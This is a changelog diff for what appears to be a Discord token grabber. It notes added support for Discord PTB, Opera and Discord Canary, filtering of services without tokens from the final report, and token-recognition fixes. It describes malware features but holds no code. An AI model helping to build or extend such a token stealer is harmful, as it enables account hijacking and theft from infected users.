+++ Changelog.md
@@ -1,5 +1,6 @@
 # 0.0.2.0
-- Added support for the browser 'Opera' and 'Discord Canary'.
+- Added support for 'Discord PTB', 'Opera' and 'Discord Canary'.
+- Made grabber not include services without tokens to the final report.
 - Made grabber remove duplicates.
 - Fixed a bug where the grabber would have problems recognizing the token.